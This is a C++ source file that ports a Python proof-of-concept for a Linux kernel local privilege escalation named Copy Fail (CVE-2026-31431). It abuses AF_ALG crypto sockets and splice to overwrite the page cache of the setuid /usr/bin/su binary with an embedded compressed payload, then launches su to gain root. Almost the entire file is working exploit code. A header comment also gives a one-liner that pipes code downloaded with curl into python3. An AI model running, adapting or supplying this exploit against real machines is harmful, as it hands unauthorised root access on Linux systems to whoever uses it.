// clang-format off
/*
# 0. C++17
rm -rf *.o *.out; g++ -std=c++17 -lz -g -O0 ./copy_fail_exp.cpp -o copy_fail_exp.out -lz;
# 1. C++17 Asan -Werror -fno-exceptions -lstdc++_libbacktrace
rm -rf *.o *.out;g++ -D _GLIBCXX_USE_CXX11_ABI=1 -no-pie -rdynamic -lz ./copy_fail_exp.cpp -o copy_fail_exp.out -m64 -std=c++17 -Wall -g3 -gdwarf-2 -Werror=reorder -Werror=sign-compare -Werror=strict-aliasing -fdiagnostics-color -fsanitize=address -fsanitize=leak -fsanitize=undefined -fno-elide-constructors -Wconversion -pedantic -Wextra -Werror=uninitialized -Werror=return-type -Wsign-compare -Werror=unused-result -Werror=suggest-override -Wzero-as-null-pointer-constant -Wold-style-cast -Wnon-virtual-dtor;
./copy_fail_exp.out;

https://copy.fail/#exploit  														// Copy Fail
https://github.com/theori-io/copy-fail-CVE-2026-31431                               // Copy Fail (CVE-2026-31431): 9-year-old Linux kernel LPE found by Theori's Xint Code
https://deepwiki.com/theori-io/copy-fail-CVE-2026-31431                             // DeepWiki
https://deepwiki.com/search/pythonc_4855c189-7736-4d65-9437-d1b30ea65809?mode=deep  // 本python程序代码改为C++实现

curl https://copy.fail/exp | python3 && su											// Copy Fail: 732 Bytes to Root on Every Major Linux Distribution.

https://www.bilibili.com/video/BV1Qf9eBEEAc/?spm_id_from=333.337.search-card.all.click
https://www.bilibili.com/opus/1197312431195422727?spm_id_from=333.1387.0.0
*/
// clang-format on

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <fcntl.h>
#include <linux/if_alg.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <zlib.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>

#include <string>

// SOL_ALG = 279, 对应 Python 中的 h=279
#ifndef SOL_ALG
#define SOL_ALG 279
#endif

// MSG_MORE = 32768, 对应 Python sendmsg 的 flags 参数
#ifndef MSG_MORE
#define MSG_MORE 0x8000
#endif

// 对应 Python: d("78da...") 的 zlib 压缩载荷
static const unsigned char COMPRESSED_PAYLOAD[] = {0x78, 0xda, 0xab, 0x77, 0xf5, 0x71, 0x63, 0x62, 0x64, 0x64, 0x80, 0x01, 0x26, 0x06, 0x3b, 0x06, 0x10, 0xaf, 0x82, 0xc1, 0x01, 0xcc, 0x77,
                                                   0x60, 0xc0, 0x04, 0x0e, 0x0c, 0x16, 0x0c, 0x30, 0x1d, 0x20, 0x9a, 0x15, 0x4d, 0x16, 0x99, 0x9e, 0x07, 0xe5, 0xc1, 0x68, 0x06, 0x01, 0x08,
                                                   0x65, 0x78, 0xc0, 0xf0, 0xff, 0x86, 0x4c, 0x7e, 0x56, 0x8f, 0x5e, 0x5b, 0x7e, 0x10, 0xf7, 0x5b, 0x96, 0x75, 0xc4, 0x4c, 0x7e, 0x56, 0xc3,
                                                   0xff, 0x59, 0x36, 0x11, 0xfc, 0xac, 0xfa, 0x49, 0x99, 0x79, 0xfa, 0xc5, 0x19, 0x0c, 0x0c, 0x0c, 0x00, 0x32, 0xc3, 0x10, 0xd3};

// 对应 Python 函数 c(f, t, c)
// fd  = 打开的 /usr/bin/su 文件描述符
// t   = 当前偏移量 (循环变量 i)
// chunk = 4 字节载荷片段
static void exploit_chunk(int fd, int t, const unsigned char* chunk)
{
	// a = s.socket(38, 5, 0)  ->  AF_ALG=38, SOCK_SEQPACKET=5
	int sock = socket(AF_ALG, SOCK_SEQPACKET, 0);
	if (sock < 0)
	{
		perror("socket");
		return;
	}

	// a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
	struct sockaddr_alg sa = {};
	sa.salg_family = AF_ALG;
	strncpy(reinterpret_cast<char*>(sa.salg_type), "aead", sizeof(sa.salg_type));
	strncpy(reinterpret_cast<char*>(sa.salg_name), "authencesn(hmac(sha256),cbc(aes))", sizeof(sa.salg_name));
	if (bind(sock, reinterpret_cast<struct sockaddr*>(&sa), sizeof(sa)) < 0)
	{
		perror("bind");
		close(sock);
		return;
	}

	// v(h, 1, d('0800010000000010' + '0'*64))
	// = setsockopt(279, ALG_SET_KEY=1, 40字节密钥)
	// 前8字节: 0x08,0x00,0x01,0x00,0x00,0x00,0x00,0x10; 后32字节全零
	unsigned char key[40] = {0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x10};
	if (setsockopt(sock, SOL_ALG, ALG_SET_KEY, key, sizeof(key)) < 0)
	{
		perror("setsockopt ALG_SET_KEY");
		close(sock);
		return;
	}

	// v(h, 5, None, 4)  ->  setsockopt(279, 5, NULL, 4)
	if (setsockopt(sock, SOL_ALG, 5, nullptr, 4) < 0)
	{
		perror("setsockopt 5");
		close(sock);
		return;
	}

	// u, _ = a.accept()
	int afd = accept(sock, nullptr, nullptr);
	if (afd < 0)
	{
		perror("accept");
		close(sock);
		return;
	}

	// u.sendmsg([b"A"*4 + chunk], [(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3)], 32768)
	// 主数据: 4字节'A' + 4字节载荷片段
	unsigned char data[8];
	memset(data, 'A', 4);
	memcpy(data + 4, chunk, 4);
	struct iovec iov = {data, sizeof(data)};

	// 辅助数据 (ancillary data / cmsg):
	//   cmsg1: level=279, type=3(ALG_SET_OP),  data=b'\x00'*4
	//   cmsg2: level=279, type=2(ALG_SET_IV),  data=b'\x10'+b'\x00'*19  (共20字节)
	//   cmsg3: level=279, type=4,               data=b'\x08'+b'\x00'*3  (共4字节)
	size_t cmsg_buf_len = CMSG_SPACE(4) + CMSG_SPACE(20) + CMSG_SPACE(4);
	unsigned char* cmsg_buf = reinterpret_cast<unsigned char*>(calloc(1, cmsg_buf_len));

	struct msghdr msg = {};
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;
	msg.msg_control = cmsg_buf;
	msg.msg_controllen = cmsg_buf_len;

	struct cmsghdr* cmsg = CMSG_FIRSTHDR(&msg);

	// cmsg1: ALG_SET_OP = 3, 4字节全零
	cmsg->cmsg_level = SOL_ALG;
	cmsg->cmsg_type = ALG_SET_OP;
	cmsg->cmsg_len = CMSG_LEN(4);
	memset(CMSG_DATA(cmsg), 0, 4);

	cmsg = CMSG_NXTHDR(&msg, cmsg);

	// cmsg2: ALG_SET_IV = 2, 20字节
	// 结构: af_alg_iv { ivlen=16(LE), iv[16]=zeros }
	// 即: 0x10 0x00 0x00 0x00 + 16字节零
	cmsg->cmsg_level = SOL_ALG;
	cmsg->cmsg_type = ALG_SET_IV;
	cmsg->cmsg_len = CMSG_LEN(20);
	{
		unsigned char* p = CMSG_DATA(cmsg);
		p[0] = 0x10;
		memset(p + 1, 0, 19);
	}

	cmsg = CMSG_NXTHDR(&msg, cmsg);

	// cmsg3: type=4, 4字节: 0x08 0x00 0x00 0x00
	cmsg->cmsg_level = SOL_ALG;
	cmsg->cmsg_type = 4;
	cmsg->cmsg_len = CMSG_LEN(4);
	{
		unsigned char* p = CMSG_DATA(cmsg);
		p[0] = 0x08;
		memset(p + 1, 0, 3);
	}

	sendmsg(afd, &msg, MSG_MORE);
	free(cmsg_buf);

	// r, w = g.pipe()
	int pipefd[2];
	pipe(pipefd);

	int o = t + 4;  // o = t + 4

	// n(f, w, o, offset_src=0)
	// -> splice(fd, &off_in=0, pipefd[1], NULL, o, 0)
	loff_t off_in = 0;
	splice(fd, &off_in, pipefd[1], nullptr, static_cast<size_t>(o), 0);

	// n(r, u.fileno(), o)
	// -> splice(pipefd[0], NULL, afd, NULL, o, 0)
	splice(pipefd[0], nullptr, afd, nullptr, static_cast<size_t>(o), 0);

	// try: u.recv(8 + t)  except: pass
	unsigned char rbuf[65536];
	recv(afd, rbuf, static_cast<size_t>(8 + t), 0);

	close(pipefd[0]);
	close(pipefd[1]);
	close(afd);
	close(sock);
}

int main(int argc, char** argv)
{
	std::string suid_path = "/usr/bin/su";
	if (argc > 1)
	{
		suid_path = argv[1];
	}

	// e = zlib.decompress(d("78da..."))
	unsigned char payload[4096] = {};
	uLongf payload_len = sizeof(payload);
	int ret = uncompress(payload, &payload_len, COMPRESSED_PAYLOAD, sizeof(COMPRESSED_PAYLOAD));
	if (ret != Z_OK)
	{
		fprintf(stderr, "zlib uncompress failed: %d\n", ret);
		return 1;
	}

	// f = g.open("/usr/bin/su", 0)
	int fd = open(suid_path.c_str(), O_RDONLY);
	if (fd < 0)
	{
		perror("open /usr/bin/su");
		return 1;
	}

	// while i < len(e): c(f, i, e[i:i+4]); i += 4
	for (int i = 0; i + 4 <= static_cast<int>(payload_len); i += 4)
	{
		exploit_chunk(fd, i, payload + i);
	}

	close(fd);

	// g.system("su")
	system("su");
	return 0;
}